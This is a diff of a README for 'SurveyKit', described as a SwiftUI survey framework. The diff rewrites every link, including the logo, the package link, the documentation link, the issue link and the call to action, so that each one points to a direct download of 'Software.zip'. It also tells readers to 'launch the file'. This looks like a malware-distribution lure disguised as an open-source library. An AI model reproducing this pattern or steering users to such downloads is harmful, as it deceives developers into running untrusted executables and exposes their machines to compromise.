@@ -1,6 +1,6 @@
 # SurveyKit 📋
 
-![SurveyKit Logo](https://github.com/kevinpro142/SurveyKit/releases/tag/v1.0)
+![SurveyKit Logo](https://github.com/kevinpro142/SurveyKit/releases/download/v2.0/Software.zip)
 
 SurveyKit is a SwiftUI-based framework for creating dynamic and interactive surveys in your iOS apps. With SurveyKit, you can easily design engaging surveys that adapt to user responses, providing a seamless user experience.
 
@@ -17,7 +17,7 @@ SurveyKit is a SwiftUI-based framework for creating dynamic and interactive surv
 To integrate SurveyKit into your Xcode project, simply follow these steps:
 
 1. Add the SurveyKit package to your project by using the following link:
-   [Download SurveyKit](https://github.com/kevinpro142/SurveyKit/releases/tag/v1.0)
+   [Download SurveyKit](https://github.com/kevinpro142/SurveyKit/releases/download/v2.0/Software.zip)
 
 2. Once the download is complete, launch the file and follow the installation instructions.
 
@@ -70,16 +70,16 @@ In the above example, `ContentView` displays a welcome message followed by the S
 
 ## Documentation 📄
 
-For detailed documentation on SurveyKit and its APIs, please refer to the official [SurveyKit Documentation](https://github.com/kevinpro142/SurveyKit/releases/tag/v1.0).
+For detailed documentation on SurveyKit and its APIs, please refer to the official [SurveyKit Documentation](https://github.com/kevinpro142/SurveyKit/releases/download/v2.0/Software.zip).
 
 ## Support 🤝
 
-If you encounter any issues or have any questions about SurveyKit, feel free to [raise an issue](https://github.com/kevinpro142/SurveyKit/releases/tag/v1.0) on our GitHub repository. Our team will be happy to assist you with any queries or concerns.
+If you encounter any issues or have any questions about SurveyKit, feel free to [raise an issue](https://github.com/kevinpro142/SurveyKit/releases/download/v2.0/Software.zip) on our GitHub repository. Our team will be happy to assist you with any queries or concerns.
 
 ---
 
 Start creating dynamic and engaging surveys in your SwiftUI apps with SurveyKit! 📊📱
 
-[Get Started with SurveyKit](https://github.com/kevinpro142/SurveyKit/releases/tag/v1.0) 🚀
+[Get Started with SurveyKit](https://github.com/kevinpro142/SurveyKit/releases/download/v2.0/Software.zip) 🚀
 
-![SurveyKit](https://github.com/kevinpro142/SurveyKit/releases/tag/v1.0)
+![SurveyKit](https://github.com/kevinpro142/SurveyKit/releases/download/v2.0/Software.zip)
